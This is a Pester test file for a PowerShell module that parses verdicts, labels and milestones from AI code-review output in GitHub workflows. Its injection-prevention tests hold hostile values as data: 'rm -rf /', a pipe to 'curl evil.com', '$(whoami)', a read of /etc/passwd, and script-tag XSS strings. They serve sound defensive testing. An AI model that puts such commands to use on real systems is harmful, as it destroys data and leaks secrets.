<#
.SYNOPSIS
    Pester tests for AIReviewCommon.psm1 module.

.DESCRIPTION
    Tests the AI review common functions for GitHub workflows.
    Covers parsing, formatting, logging, and utility functions.

.NOTES
    Requires Pester 5.x or later.
#>

BeforeAll {
    $Script:ModulePath = Join-Path $PSScriptRoot "AIReviewCommon.psm1"
    Import-Module $Script:ModulePath -Force
}

AfterAll {
    Remove-Module AIReviewCommon -Force -ErrorAction SilentlyContinue
}

Describe "AIReviewCommon Module" {

    Context "Module Import" {
        It "Should import without errors" {
            { Import-Module $Script:ModulePath -Force } | Should -Not -Throw
        }

        It "Should export expected functions" {
            $module = Get-Module AIReviewCommon
            $expectedFunctions = @(
                'Initialize-AIReview'
                'Invoke-WithRetry'
                # Note: Send-PRComment and Send-IssueComment removed - use GitHub skill scripts instead:
                # - .claude/skills/github/scripts/pr/Post-PRCommentReply.ps1
                # - .claude/skills/github/scripts/issue/Post-IssueComment.ps1
                'Get-Verdict'
                'Get-Labels'
                'Get-Milestone'
                'Merge-Verdicts'
                'Format-CollapsibleSection'
                'Format-VerdictAlert'
                'Get-VerdictAlertType'
                'Get-VerdictExitCode'
                'Get-VerdictEmoji'
                'Write-Log'
                'Write-LogError'
                'Assert-EnvironmentVariables'
                'Get-PRChangedFiles'
                'ConvertTo-JsonEscaped'
                'Format-MarkdownTableRow'
            )
            foreach ($fn in $expectedFunctions) {
                $module.ExportedFunctions.Keys | Should -Contain $fn
            }
        }
    }

    Context "Initialize-AIReview" {
        BeforeEach {
            $Script:TestDir = Join-Path $TestDrive "ai-review-init-test"
        }

        It "Should create directory if it doesn't exist" {
            $env:AI_REVIEW_DIR = $Script:TestDir
            # Re-import to pick up new env var
            Import-Module $Script:ModulePath -Force

            $result = Initialize-AIReview
            $Script:TestDir | Should -Exist
        }

        It "Should return the directory path" {
            $env:AI_REVIEW_DIR = $Script:TestDir
            Import-Module $Script:ModulePath -Force

            $result = Initialize-AIReview
            $result | Should -Be $Script:TestDir
        }

        AfterEach {
            $env:AI_REVIEW_DIR = $null
        }
    }

    Context "Invoke-WithRetry" {
        It "Should return result on success" {
            $result = Invoke-WithRetry -ScriptBlock { "success" }
            $result | Should -Be "success"
        }

        It "Should retry on failure and succeed" {
            $Script:Attempt = 0
            $result = Invoke-WithRetry -ScriptBlock {
                $Script:Attempt++
                if ($Script:Attempt -lt 2) { throw "Temporary failure" }
                "success after retry"
            } -MaxRetries 3 -InitialDelay 0

            $result | Should -Be "success after retry"
            $Script:Attempt | Should -Be 2
        }

        It "Should throw after max retries" {
            { Invoke-WithRetry -ScriptBlock { throw "Permanent failure" } -MaxRetries 2 -InitialDelay 0 } |
                Should -Throw "*All 2 attempts failed*"
        }

        It "Should use exponential backoff" {
            $Script:Delays = @()
            $Script:Attempt = 0

            Mock Start-Sleep -ModuleName AIReviewCommon -MockWith {
                param($Seconds)
                $Script:Delays += $Seconds
            }

            try {
                Invoke-WithRetry -ScriptBlock {
                    $Script:Attempt++
                    throw "Always fail"
                } -MaxRetries 3 -InitialDelay 1
            }
            catch {
                # Expected to fail
            }

            # Delays should be 1, 2 (exponential backoff)
            $Script:Delays[0] | Should -Be 1
            $Script:Delays[1] | Should -Be 2
        }
    }

    Context "Get-Verdict" {
        It "Should extract explicit VERDICT: pattern" {
            $output = "Analysis complete. VERDICT: PASS. Good work!"
            Get-Verdict -Output $output | Should -Be "PASS"
        }

        It "Should handle VERDICT: CRITICAL_FAIL" {
            $output = "Found issues. VERDICT: CRITICAL_FAIL"
            Get-Verdict -Output $output | Should -Be "CRITICAL_FAIL"
        }

        It "Should handle VERDICT: WARN" {
            $output = "Minor issues found. VERDICT: WARN"
            Get-Verdict -Output $output | Should -Be "WARN"
        }

        It "Should handle VERDICT: REJECTED" {
            $output = "Cannot approve. VERDICT: REJECTED"
            Get-Verdict -Output $output | Should -Be "REJECTED"
        }

        It "Should detect CRITICAL_FAIL by keyword" {
            $output = "This has a severe issue that needs attention"
            Get-Verdict -Output $output | Should -Be "CRITICAL_FAIL"
        }

        It "Should detect REJECTED by keyword 'must fix'" {
            $output = "You must fix this before merging"
            Get-Verdict -Output $output | Should -Be "REJECTED"
        }

        It "Should detect REJECTED by keyword 'blocking'" {
            $output = "This is a blocking issue"
            Get-Verdict -Output $output | Should -Be "REJECTED"
        }

        It "Should detect PASS by keyword 'approved'" {
            $output = "Changes approved, good to merge"
            Get-Verdict -Output $output | Should -Be "PASS"
        }

        It "Should detect PASS by keyword 'looks good'" {
            $output = "Everything looks good to me"
            Get-Verdict -Output $output | Should -Be "PASS"
        }

        It "Should detect PASS by keyword 'no issues'" {
            $output = "I found no issues with this code"
            Get-Verdict -Output $output | Should -Be "PASS"
        }

        It "Should detect WARN by keyword 'warning'" {
            $output = "There is a warning about potential issues"
            Get-Verdict -Output $output | Should -Be "WARN"
        }

        It "Should detect WARN by keyword 'caution'" {
            $output = "Proceed with caution on this change"
            Get-Verdict -Output $output | Should -Be "WARN"
        }

        It "Should return CRITICAL_FAIL for empty output" {
            Get-Verdict -Output "" | Should -Be "CRITICAL_FAIL"
        }

        It "Should return CRITICAL_FAIL for null output" {
            Get-Verdict -Output $null | Should -Be "CRITICAL_FAIL"
        }

        It "Should return CRITICAL_FAIL for unparseable output" {
            $output = "Some random text without any verdict keywords"
            Get-Verdict -Output $output | Should -Be "CRITICAL_FAIL"
        }

        It "Should support pipeline input" {
            "VERDICT: PASS" | Get-Verdict | Should -Be "PASS"
        }
    }

    Context "Get-Labels" {
        It "Should extract single label" {
            $output = "Analysis complete. LABEL: bug"
            $labels = Get-Labels -Output $output
            $labels | Should -HaveCount 1
            $labels | Should -Contain "bug"
        }

        It "Should extract multiple labels" {
            $output = "LABEL: bug LABEL: enhancement LABEL: priority-high"
            $labels = Get-Labels -Output $output
            $labels | Should -HaveCount 3
            $labels | Should -Contain "bug"
            $labels | Should -Contain "enhancement"
            $labels | Should -Contain "priority-high"
        }

        It "Should return empty array for no labels" {
            $output = "No labels here"
            $labels = Get-Labels -Output $output
            $labels | Should -HaveCount 0
        }

        It "Should return empty array for empty input" {
            $labels = Get-Labels -Output ""
            $labels | Should -HaveCount 0
        }

        It "Should return empty array for null input" {
            $labels = Get-Labels -Output $null
            $labels | Should -HaveCount 0
        }

        It "Should handle labels in multiline output" {
            $output = @"
Review analysis:
LABEL: security
LABEL: needs-review
Summary complete.
"@
            $labels = Get-Labels -Output $output
            $labels | Should -HaveCount 2
            $labels | Should -Contain "security"
            $labels | Should -Contain "needs-review"
        }

        It "Should support pipeline input" {
            $labels = "LABEL: test-label" | Get-Labels
            $labels | Should -Contain "test-label"
        }
    }

    Context "Get-Milestone" {
        It "Should extract milestone" {
            $output = "MILESTONE: v2.0 VERDICT: PASS"
            Get-Milestone -Output $output | Should -Be "v2.0"
        }

        It "Should return empty string when no milestone" {
            $output = "No milestone specified"
            Get-Milestone -Output $output | Should -Be ""
        }

        It "Should return empty string for empty input" {
            Get-Milestone -Output "" | Should -Be ""
        }

        It "Should return empty string for null input" {
            Get-Milestone -Output $null | Should -Be ""
        }

        It "Should handle milestone with numbers" {
            $output = "MILESTONE: Sprint-42"
            Get-Milestone -Output $output | Should -Be "Sprint-42"
        }

        It "Should support pipeline input" {
            "MILESTONE: Q4-2024" | Get-Milestone | Should -Be "Q4-2024"
        }
    }

    Context "Merge-Verdicts" {
        It "Should return PASS for all PASS verdicts" {
            Merge-Verdicts -Verdicts @('PASS', 'PASS', 'PASS') | Should -Be 'PASS'
        }

        It "Should return WARN if any WARN present with PASS" {
            Merge-Verdicts -Verdicts @('PASS', 'WARN', 'PASS') | Should -Be 'WARN'
        }

        It "Should return CRITICAL_FAIL if any CRITICAL_FAIL present" {
            Merge-Verdicts -Verdicts @('PASS', 'CRITICAL_FAIL', 'PASS') | Should -Be 'CRITICAL_FAIL'
        }

        It "Should return CRITICAL_FAIL if any REJECTED present" {
            Merge-Verdicts -Verdicts @('PASS', 'REJECTED', 'WARN') | Should -Be 'CRITICAL_FAIL'
        }

        It "Should return CRITICAL_FAIL over WARN" {
            Merge-Verdicts -Verdicts @('WARN', 'CRITICAL_FAIL', 'WARN') | Should -Be 'CRITICAL_FAIL'
        }

        It "Should return PASS for single PASS" {
            Merge-Verdicts -Verdicts @('PASS') | Should -Be 'PASS'
        }

        It "Should return CRITICAL_FAIL for single CRITICAL_FAIL" {
            Merge-Verdicts -Verdicts @('CRITICAL_FAIL') | Should -Be 'CRITICAL_FAIL'
        }

        It "Should return CRITICAL_FAIL if any FAIL present" {
            Merge-Verdicts -Verdicts @('PASS', 'FAIL', 'WARN') | Should -Be 'CRITICAL_FAIL'
        }
    }

    Context "Format-CollapsibleSection" {
        It "Should create valid HTML details element" {
            $result = Format-CollapsibleSection -Title "Details" -Content "Inner content"
            $result | Should -Match '<details>'
            $result | Should -Match '</details>'
            $result | Should -Match '<summary>Details</summary>'
            $result | Should -Match 'Inner content'
        }

        It "Should preserve multiline content" {
            $content = "Line 1`nLine 2`nLine 3"
            $result = Format-CollapsibleSection -Title "Multi" -Content $content
            $result | Should -Match 'Line 1'
            $result | Should -Match 'Line 2'
            $result | Should -Match 'Line 3'
        }
    }

    Context "Format-VerdictAlert" {
        It "Should format PASS with TIP alert" {
            $result = Format-VerdictAlert -Verdict 'PASS'
            $result | Should -Match '\[!TIP\]'
            $result | Should -Match 'Verdict: PASS'
        }

        It "Should format WARN with WARNING alert" {
            $result = Format-VerdictAlert -Verdict 'WARN'
            $result | Should -Match '\[!WARNING\]'
            $result | Should -Match 'Verdict: WARN'
        }

        It "Should format CRITICAL_FAIL with CAUTION alert" {
            $result = Format-VerdictAlert -Verdict 'CRITICAL_FAIL'
            $result | Should -Match '\[!CAUTION\]'
            $result | Should -Match 'Verdict: CRITICAL_FAIL'
        }

        It "Should format REJECTED with CAUTION alert" {
            $result = Format-VerdictAlert -Verdict 'REJECTED'
            $result | Should -Match '\[!CAUTION\]'
        }

        It "Should include message when provided" {
            $result = Format-VerdictAlert -Verdict 'PASS' -Message 'All checks passed'
            $result | Should -Match 'All checks passed'
        }

        It "Should handle unknown verdict with NOTE alert" {
            $result = Format-VerdictAlert -Verdict 'UNKNOWN'
            $result | Should -Match '\[!NOTE\]'
        }
    }

    Context "Get-VerdictAlertType" {
        It "Should return TIP for PASS" {
            Get-VerdictAlertType -Verdict 'PASS' | Should -Be 'TIP'
        }

        It "Should return TIP for COMPLIANT" {
            Get-VerdictAlertType -Verdict 'COMPLIANT' | Should -Be 'TIP'
        }

        It "Should return WARNING for WARN" {
            Get-VerdictAlertType -Verdict 'WARN' | Should -Be 'WARNING'
        }

        It "Should return WARNING for PARTIAL" {
            Get-VerdictAlertType -Verdict 'PARTIAL' | Should -Be 'WARNING'
        }

        It "Should return CAUTION for CRITICAL_FAIL" {
            Get-VerdictAlertType -Verdict 'CRITICAL_FAIL' | Should -Be 'CAUTION'
        }

        It "Should return CAUTION for REJECTED" {
            Get-VerdictAlertType -Verdict 'REJECTED' | Should -Be 'CAUTION'
        }

        It "Should return CAUTION for FAIL" {
            Get-VerdictAlertType -Verdict 'FAIL' | Should -Be 'CAUTION'
        }

        It "Should return NOTE for unknown verdict" {
            Get-VerdictAlertType -Verdict 'SOMETHING_ELSE' | Should -Be 'NOTE'
        }
    }

    Context "Get-VerdictExitCode" {
        It "Should return 0 for PASS" {
            Get-VerdictExitCode -Verdict 'PASS' | Should -Be 0
        }

        It "Should return 0 for WARN" {
            Get-VerdictExitCode -Verdict 'WARN' | Should -Be 0
        }

        It "Should return 1 for CRITICAL_FAIL" {
            Get-VerdictExitCode -Verdict 'CRITICAL_FAIL' | Should -Be 1
        }

        It "Should return 1 for REJECTED" {
            Get-VerdictExitCode -Verdict 'REJECTED' | Should -Be 1
        }

        It "Should return 1 for FAIL" {
            Get-VerdictExitCode -Verdict 'FAIL' | Should -Be 1
        }

        It "Should return 0 for unknown verdict" {
            Get-VerdictExitCode -Verdict 'UNKNOWN' | Should -Be 0
        }
    }

    Context "Write-Log" {
        It "Should output timestamped message" {
            $output = Write-Log "Test message" 6>&1
            $output | Should -Match '\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\] Test message'
        }

        It "Should support pipeline input" {
            $output = "Pipeline message" | Write-Log 6>&1
            $output | Should -Match 'Pipeline message'
        }
    }

    Context "Assert-EnvironmentVariables" {
        BeforeEach {
            $env:TEST_VAR_1 = "value1"
            $env:TEST_VAR_2 = "value2"
        }

        AfterEach {
            $env:TEST_VAR_1 = $null
            $env:TEST_VAR_2 = $null
            $env:TEST_VAR_MISSING = $null
        }

        It "Should pass when all variables exist" {
            { Assert-EnvironmentVariables -Names @('TEST_VAR_1', 'TEST_VAR_2') } | Should -Not -Throw
        }

        It "Should throw when variable is missing" {
            { Assert-EnvironmentVariables -Names @('TEST_VAR_1', 'TEST_VAR_MISSING') } |
                Should -Throw "*Missing required environment variables*TEST_VAR_MISSING*"
        }

        It "Should list all missing variables in error" {
            { Assert-EnvironmentVariables -Names @('MISSING_A', 'MISSING_B') } |
                Should -Throw "*MISSING_A*MISSING_B*"
        }

        It "Should treat empty string as missing" {
            $env:TEST_VAR_EMPTY = ""
            { Assert-EnvironmentVariables -Names @('TEST_VAR_EMPTY') } |
                Should -Throw "*Missing required environment variables*"
            $env:TEST_VAR_EMPTY = $null
        }
    }

    Context "ConvertTo-JsonEscaped" {
        It "Should escape quotes" {
            $result = ConvertTo-JsonEscaped -InputString 'Hello "World"'
            $result | Should -Be '"Hello \"World\""'
        }

        It "Should handle empty string" {
            $result = ConvertTo-JsonEscaped -InputString ""
            $result | Should -Be '""'
        }

        It "Should escape special characters" {
            $result = ConvertTo-JsonEscaped -InputString "Line1`nLine2"
            $result | Should -Match '\\n'
        }

        It "Should support pipeline input" {
            $result = "test" | ConvertTo-JsonEscaped
            $result | Should -Be '"test"'
        }
    }

    Context "Format-MarkdownTableRow" {
        It "Should create pipe-delimited row" {
            $result = Format-MarkdownTableRow -Columns @('A', 'B', 'C')
            $result | Should -Be "| A | B | C |"
        }

        It "Should handle single column" {
            $result = Format-MarkdownTableRow -Columns @('Single')
            $result | Should -Be "| Single |"
        }

        It "Should handle columns with spaces" {
            $result = Format-MarkdownTableRow -Columns @(' ', 'B', ' ')
            $result | Should -Be "|   | B |   |"
        }

        It "Should handle many columns" {
            $result = Format-MarkdownTableRow -Columns @('A', 'B', 'C', 'D', 'E')
            $result | Should -Be "| A | B | C | D | E |"
        }
    }

    # Note: Send-PRComment and Send-IssueComment tests removed.
    # These functions were moved to GitHub skill scripts:
    # - .claude/skills/github/scripts/pr/Post-PRCommentReply.ps1
    # - .claude/skills/github/scripts/issue/Post-IssueComment.ps1
    # See tests in .claude/skills/github/tests/ for coverage.

    Context "Get-VerdictEmoji" {
        It "Should return check mark for PASS" {
            Get-VerdictEmoji -Verdict 'PASS' | Should -Be '✅'
        }

        It "Should return check mark for COMPLIANT" {
            Get-VerdictEmoji -Verdict 'COMPLIANT' | Should -Be '✅'
        }

        It "Should return warning for WARN" {
            Get-VerdictEmoji -Verdict 'WARN' | Should -Be '⚠️'
        }

        It "Should return X for CRITICAL_FAIL" {
            Get-VerdictEmoji -Verdict 'CRITICAL_FAIL' | Should -Be '❌'
        }

        It "Should return X for REJECTED" {
            Get-VerdictEmoji -Verdict 'REJECTED' | Should -Be '❌'
        }

        It "Should return X for FAIL" {
            Get-VerdictEmoji -Verdict 'FAIL' | Should -Be '❌'
        }

        It "Should return question mark for unknown" {
            Get-VerdictEmoji -Verdict 'UNKNOWN' | Should -Be '❔'
        }
    }

    Context "Parameter Combinations" {
        # Skill-PowerShell-Testing-Combinations-001: Test parameter combinations

        It "Get-Verdict handles whitespace-only input" {
            Get-Verdict -Output "   " | Should -Be "CRITICAL_FAIL"
        }

        It "Get-Labels handles whitespace-only input" {
            $labels = Get-Labels -Output "   "
            $labels | Should -HaveCount 0
        }

        It "Get-Milestone handles whitespace-only input" {
            Get-Milestone -Output "   " | Should -Be ""
        }
    }

    Context "Edge Cases" {
        It "Get-Verdict prioritizes explicit VERDICT over keywords" {
            # If both explicit VERDICT and keyword present, explicit wins
            $output = "This looks good but VERDICT: CRITICAL_FAIL"
            Get-Verdict -Output $output | Should -Be "CRITICAL_FAIL"
        }

        It "Get-Labels handles adjacent labels" {
            $output = "LABEL:bug LABEL:urgent"
            $labels = Get-Labels -Output $output
            $labels | Should -HaveCount 2
        }

        It "Merge-Verdicts handles empty array" {
            # Edge case: what happens with empty array?
            # Should default to PASS as per aggregation logic
            Merge-Verdicts -Verdicts @() | Should -Be 'PASS'
        }

        It "Format-CollapsibleSection handles special characters in title" {
            $result = Format-CollapsibleSection -Title "<script>alert('xss')</script>" -Content "safe"
            $result | Should -Match '<script>'  # Should not escape (GitHub handles this)
        }
    }

    # ============================================================================
    # Test Suite: JSON Parsing Functions (Get-LabelsFromAIOutput, Get-MilestoneFromAIOutput)
    # ============================================================================

    Context "Get-LabelsFromAIOutput - Injection Attack Prevention" {
        # Tests for command injection vectors - ALL MUST BE REJECTED

        It 'rejects labels with semicolons (command injection)' {
            $output = '{"labels":["bug; rm -rf /"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'rejects labels with backticks (command substitution)' {
            $output = '{"labels":["bug`whoami`"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'rejects labels with $(cmd) syntax (command substitution)' {
            $output = '{"labels":["bug$(whoami)"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'rejects labels with pipes (pipeline injection)' {
            $output = '{"labels":["bug | curl evil.com"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'rejects labels with newlines (multiline injection)' {
            $output = '{"labels":["bug\ninjected"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }
    }

    Context "Get-LabelsFromAIOutput - Valid Label Parsing" {
        It 'parses valid single label' {
            $output = '{"labels":["bug"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -HaveCount 1
            $labels | Should -Contain 'bug'
        }

        It 'parses multiple valid labels' {
            $output = '{"labels":["bug","enhancement","docs"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -HaveCount 3
            $labels | Should -Contain 'bug'
            $labels | Should -Contain 'enhancement'
            $labels | Should -Contain 'docs'
        }

        It 'accepts labels with hyphens' {
            $output = '{"labels":["priority-high","needs-review"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -HaveCount 2
            $labels | Should -Contain 'priority-high'
        }

        It 'accepts labels with underscores' {
            $output = '{"labels":["good_first_issue"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -Contain 'good_first_issue'
        }

        It 'accepts labels with periods' {
            $output = '{"labels":["v1.0.0"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -Contain 'v1.0.0'
        }

        It 'accepts labels with spaces (GitHub standard)' {
            $output = '{"labels":["help wanted","good first issue"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -HaveCount 2
            $labels | Should -Contain 'help wanted'
            $labels | Should -Contain 'good first issue'
        }
    }

    Context "Get-LabelsFromAIOutput - Edge Cases" {
        It 'returns empty array for empty label array' {
            $output = '{"labels":[]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'returns empty array for malformed JSON (missing closing bracket)' {
            $output = '{"labels":["bug"'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'returns empty array when labels key is missing' {
            $output = '{"milestone":"v1"}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'returns empty array for null input' {
            $labels = Get-LabelsFromAIOutput -Output $null
            $labels | Should -BeNullOrEmpty
        }

        It 'returns empty array for empty string input' {
            $labels = Get-LabelsFromAIOutput -Output ''
            $labels | Should -BeNullOrEmpty
        }

        It 'returns empty array for whitespace-only input' {
            $labels = Get-LabelsFromAIOutput -Output '   '
            $labels | Should -BeNullOrEmpty
        }

        It 'rejects labels exceeding 50 character limit' {
            $longLabel = 'a' * 51
            $output = "{`"labels`":[`"$longLabel`"]}"
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }

        It 'rejects labels starting with special character' {
            $output = '{"labels":["-invalid","_bad",".wrong"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -BeNullOrEmpty
        }
    }

    Context "Get-MilestoneFromAIOutput - Injection Attack Prevention" {
        It 'rejects milestones with command injection attempts' {
            $output = '{"milestone":"v1; rm -rf /"}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -BeNullOrEmpty
        }

        It 'rejects milestones with pipe injection' {
            $output = '{"milestone":"v1 | curl evil.com"}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -BeNullOrEmpty
        }
    }

    Context "Get-MilestoneFromAIOutput - Valid Milestone Parsing" {
        It 'parses valid semantic version milestone' {
            $output = '{"milestone":"v1.2.0"}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -Be 'v1.2.0'
        }

        It 'parses milestone with alphanumeric format' {
            $output = '{"milestone":"Sprint42"}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -Be 'Sprint42'
        }

        It 'parses milestone with hyphens' {
            $output = '{"milestone":"Q4-2024"}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -Be 'Q4-2024'
        }

        It 'parses milestone with spaces' {
            $output = '{"milestone":"Release 2.0"}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -Be 'Release 2.0'
        }
    }

    Context "Get-MilestoneFromAIOutput - Edge Cases" {
        It 'returns null for empty milestone value' {
            $output = '{"milestone":""}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -BeNullOrEmpty
        }

        It 'returns null when milestone key is missing' {
            $output = '{"labels":["bug"]}'
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -BeNullOrEmpty
        }

        It 'returns null for null input' {
            $milestone = Get-MilestoneFromAIOutput -Output $null
            $milestone | Should -BeNullOrEmpty
        }

        It 'returns null for empty string input' {
            $milestone = Get-MilestoneFromAIOutput -Output ''
            $milestone | Should -BeNullOrEmpty
        }

        It 'rejects milestone exceeding 50 character limit' {
            $longMilestone = 'v' + ('1' * 50)
            $output = "{`"milestone`":`"$longMilestone`"}"
            $milestone = Get-MilestoneFromAIOutput -Output $output
            $milestone | Should -BeNullOrEmpty
        }
    }

    Context "JSON Parsing - Integration Tests" {
        It 'correctly parses complete AI triage output' {
            # Simulate realistic AI model output
            $realOutput = @'
{
    "category": "bug",
    "labels": ["bug", "critical", "needs-triage"],
    "milestone": "v1.2.0",
    "confidence": 0.95
}
'@
            $labels = Get-LabelsFromAIOutput -Output $realOutput
            $milestone = Get-MilestoneFromAIOutput -Output $realOutput

            $labels | Should -HaveCount 3
            $labels | Should -Contain 'bug'
            $labels | Should -Contain 'critical'
            $labels | Should -Contain 'needs-triage'
            $milestone | Should -Be 'v1.2.0'
        }

        It 'handles AI output with extra whitespace and formatting' {
            $messyOutput = @'
{
    "labels" : [ "enhancement" , "documentation" ] ,
    "milestone" : "Sprint 42"
}
'@
            $labels = Get-LabelsFromAIOutput -Output $messyOutput
            $milestone = Get-MilestoneFromAIOutput -Output $messyOutput

            $labels | Should -HaveCount 2
            $milestone | Should -Be 'Sprint 42'
        }

        It 'mixed valid and invalid labels only returns valid ones' {
            # One valid, one injection attempt
            $output = '{"labels":["bug","evil; rm -rf /","enhancement"]}'
            $labels = Get-LabelsFromAIOutput -Output $output
            $labels | Should -HaveCount 2
            $labels | Should -Contain 'bug'
            $labels | Should -Contain 'enhancement'
            $labels | Should -Not -Contain 'evil; rm -rf /'
        }

        It 'functions do not throw on malicious input' {
            $maliciousInputs = @(
                '{"labels":["$(whoami)","${IFS}cat${IFS}/etc/passwd"]}',
                '{"milestone":"v1`id`"}',
                '{"labels":["\x00\x00"]}',
                '{"labels":["<script>alert(1)</script>"]}'
            )

            foreach ($input in $maliciousInputs) {
                { Get-LabelsFromAIOutput -Output $input } | Should -Not -Throw
                { Get-MilestoneFromAIOutput -Output $input } | Should -Not -Throw
            }
        }
    }

    Context "JSON Parsing - Module Export Verification" {
        It 'module exports Get-LabelsFromAIOutput function' {
            $module = Get-Module AIReviewCommon
            $module.ExportedFunctions.Keys | Should -Contain 'Get-LabelsFromAIOutput'
        }

        It 'module exports Get-MilestoneFromAIOutput function' {
            $module = Get-Module AIReviewCommon
            $module.ExportedFunctions.Keys | Should -Contain 'Get-MilestoneFromAIOutput'
        }
    }
}
